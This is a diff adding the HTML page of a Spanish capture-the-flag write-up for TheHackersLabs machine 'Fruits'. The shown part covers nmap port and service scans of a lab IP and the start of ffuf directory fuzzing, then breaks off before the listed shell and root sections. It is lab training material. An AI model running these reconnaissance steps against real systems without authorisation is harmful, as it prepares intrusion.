@@ -1,0 +1,852 @@
+<!doctype html>
+<html lang="en" data-bs-theme="dark">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/dismissable-alert.f79a34cc26a97c892c86579f12a7b364868652fb40860b0a4586b868206dc20d.js"
+  integrity="sha256-95o0zCapfIkshlefEqezZIaGUvtAhgsKRYa4aCBtwg0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.01b0834d5af51b24812d02878d09c8d7677d6b8af13164fb50215889dc19aaefd0e9366c13b45a9a57ae481dfd1836bce46b5ebfe461d56e3498b9443d8c5e27.css" integrity="sha512-AbCDTVr1GySBLQKHjQnI12d9a4rxMWT7UCFYidwZqu/Q6TZsE7RamleuSB39GDa85Gtev&#43;Rh1W40mLlEPYxeJw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/challenges/thehackerslabs/fruits/">
+  <link rel="canonical" href="http://localhost:1313/challenges/thehackerslabs/fruits/">
+<title>Fruits  |  pylon</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+<meta property="og:title" content="Fruits">
+<meta property="og:description" content="Enumeration Vamos a empezar con un buen escaneo nmap:
+┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://localhost:1313/challenges/thehackerslabs/fruits/"><meta property="og:image" content="http://localhost:1313/cover.png"><meta property="article:section" content="challenges">
+<meta property="article:published_time" content="2025-07-15T16:04:48+02:00">
+<meta property="article:modified_time" content="2025-07-15T16:04:48+02:00"><meta property="og:site_name" content="pylon">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/cover.png"><meta name="twitter:title" content="Fruits">
+<meta name="twitter:description" content="Enumeration Vamos a empezar con un buen escaneo nmap:
+┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.">
+<meta name="twitter:site" content="@pylonetwork">
+
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "Pylon",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/challenges/",
+       "name": "Bienvenido",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/challenges/thehackerslabs/",
+       "name": "Thehackerslabs",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "name": "Fruits",
+       "position": 4
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section challenges" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div id="announcement" data-id="global-alert-83e6602f9a5d186baf2df9c635b83c66" class="alert alert-primary alert-dismissible fade show text-center" role="alert">
+    <span class="alert-text">¡Nuevo writeup de la máquina "<a href="/writeups/hackmyvm/method/">Method</a>" de HackMyVM!</span>
+    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+  </div>
+
+<div class="sticky-top">
+<div class="header-bar"></div>
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">pylon</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="header-bar"></div>
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Challenges</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open open>
+      <summary>THEHACKERSLABS</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li class="active" >
+      <a aria-current="page" href="/challenges/thehackerslabs/fruits/">Fruits</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>INTRO</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/challenges/intro/bienvenido/">Bienvenido 👋</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="header-bar d-lg-none"></div>
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">pylon</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/writeups/intro/bienvenido/">Writeups</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/challenges/intro/bienvenido/" aria-current="true">Challenges</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/Pylonet"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open open>
+      <summary>THEHACKERSLABS</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li class="active" >
+      <a aria-current="page" href="/challenges/thehackerslabs/fruits/">Fruits</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>INTRO</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/challenges/intro/bienvenido/">Bienvenido 👋</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  <h3>On this page</h3>
+    <nav id="toc">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#shell-as-bananaman">Shell as bananaman</a></li>
+    <li><a href="#shell-as-root">Shell as root</a></li>
+    <li><a href="#reseña">Reseña</a></li>
+  </ul>
+</nav>
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1></h1>
+			<div style="display: flex; align-items: center;">
+    
+            <div style="border-left: 8px solid #4CA113; height: 40px; margin-right: 10px;"></div>
+        
+    <h1 style="margin: 0; vertical-align: middle;">Fruits</h1>
+</div>
+
+<div style="display: flex; align-items: center; vertical-align: middle; margin-top: 15px; margin-bottom: 25px;">
+    
+            <img src="/images/logos/linux.png" alt="" style="width: 40px; height: 40px; margin-right: 10px; vertical-align: middle;">
+        
+    
+						<img src="/images/logos/thl.png" alt="" style="width: 40px; height: 40px; margin-right: 10px; vertical-align: middle;">
+				
+    
+</div>
+
+
+			
+
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				<details>
+    <summary>On this page</summary>
+    <div class="page-links">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#shell-as-bananaman">Shell as bananaman</a></li>
+    <li><a href="#shell-as-root">Shell as root</a></li>
+    <li><a href="#reseña">Reseña</a></li>
+  </ul>
+</nav>
+    </div>
+  </details>
+
+			</nav>
+			<h2 id="enumeration">Enumeration<a href="#enumeration" class="anchor" aria-hidden="true">#</a> </h2>
+<p>Vamos a empezar con un buen escaneo <code>nmap</code>:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>pylon㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/pylon/THL/Fruits/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -p- --open -sS --min-rate<span class="o">=</span><span class="m">5000</span> -n -Pn -vvv 192.168.231.129
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-15 12:27 CEST
+</span></span><span class="line"><span class="cl">Initiating ARP Ping Scan at 12:27
+</span></span><span class="line"><span class="cl">Scanning 192.168.231.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Completed ARP Ping Scan at 12:27, 0.05s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 12:27
+</span></span><span class="line"><span class="cl">Scanning 192.168.231.129 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 192.168.231.129
+</span></span><span class="line"><span class="cl">Discovered open port 22/tcp on 192.168.231.129
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 12:27, 0.80s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.231.129
+</span></span><span class="line"><span class="cl">Host is up, received arp-response <span class="o">(</span>0.000043s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-07-15 12:27:48 CEST <span class="k">for</span> 1s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:DC:2D:B0 <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.98 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">65536</span> <span class="o">(</span>2.884MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">65536</span> <span class="o">(</span>2.621MB<span class="o">)</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>Vemos el puerto <code>80</code> y <code>22</code> abiertos, vamos a enumerar su servicio y dicha versión de el:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>pylon㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/pylon/THL/Fruits/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -p22,80 -sCV 192.168.231.129
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-15 12:29 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.231.129
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00016s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> ae:dd:1a:b6:db:a7:c7:8c:f3:03:b8:05:da:e0:51:68 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 68:16:a7:3a:63:0c:8b:f6:ba:a1:ff:c0:34:e8:bf:80 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.57 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: P<span class="se">\x</span>C3<span class="se">\x</span>A1gina de Frutas
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.57 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:DC:2D:B0 <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 19.52 seconds</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Obtenemos la siguiente información:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Puerto</strong></th>
+<th><strong>Descripción</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>22/tcp</code></td>
+<td><code>OpenSSH 9.2p1 Debian</code></td>
+</tr>
+<tr>
+<td><code>80/tcp</code></td>
+<td><code>Apache httpd 2.4.57 ((Debian))</code></td>
+</tr>
+</tbody>
+</table>
+<p>Vemos que el posible sistema operativo puede ser un <code>Debian</code> . Vamos a ver la web:</p>
+
+<figure>
+  <img
+    srcset="data:image/webp;base64,UklGRoAAAABXRUJQVlA4IHQAAAAwAgCdASoQAAcAAph8J7ACdAYstUD3T7E0AAD&#43;Bdvjl0ahBLmEVasqCKOTc0BA39xbH/poe8xIhjIELBHJNj5VTJqMvraDH0&#43;N7lQcXzzzmj6AmJz9EvB/8m/a4q794KlbwiXn9xIx&#43;ecsI/gtj&#43;e338AAAA=="
+        data-srcset="/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_1861x0_resize_q85_h2_lanczos_3.webp 1861w"
+        data-sizes="auto"
+    src="/images/thl/fruits/1_hu38e464e49bdee1cc80f7cbbf3d949ab2_3454741_480x0_resize_q85_bgffffff_lanczos_3.jpg"
+    width="1861"
+    height="818"
+    decoding="async"
+    fetchpriority="auto"
+    loading="lazy"
+    alt=""
+    class="lazyload blur-up"
+  >
+</figure>
+<p>Vemos que es un buscador de frutas, vamos a buscar algo al azar:</p>
+
+<figure>
+  <img
+    srcset="data:image/webp;base64,UklGRiwAAABXRUJQVlA4ICAAAADQAQCdASoQAAYAAph8J6QAAxZhrCeMAAD&#43;6phPjBoAAA=="
+        data-srcset="/images/thl/fruits/2_hu51f6e2f4193b63f318115322cb293fbb_49372_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/fruits/2_hu51f6e2f4193b63f318115322cb293fbb_49372_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/fruits/2_hu51f6e2f4193b63f318115322cb293fbb_49372_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/fruits/2_hu51f6e2f4193b63f318115322cb293fbb_49372_793x0_resize_q85_h2_lanczos_3.webp 793w"
+        data-sizes="auto"
+    src="/images/thl/fruits/2_hu51f6e2f4193b63f318115322cb293fbb_49372_480x0_resize_q85_bgffffff_lanczos_3.jpg"
+    width="793"
+    height="274"
+    decoding="async"
+    fetchpriority="auto"
+    loading="lazy"
+    alt=""
+    class="lazyload blur-up"
+  >
+</figure>
+<p>Vemos que el archivo <code>buscar.php</code> no existe, así que casi nos cuelan un rabbit hole. Vamos a hacer fuzzing:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>pylon㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/pylon/THL/Fruits/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <span class="s2">&#34;http://192.168.231.129/FUZZ&#34;</span> -e .php,.html,.js,.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://192.168.231.129/FUZZ
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"> :: Extensions       : .php .html .js .txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">index.html              <span class="o">[</span>Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.html                   <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 0ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">[</span>Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms<span class="o">]</span>
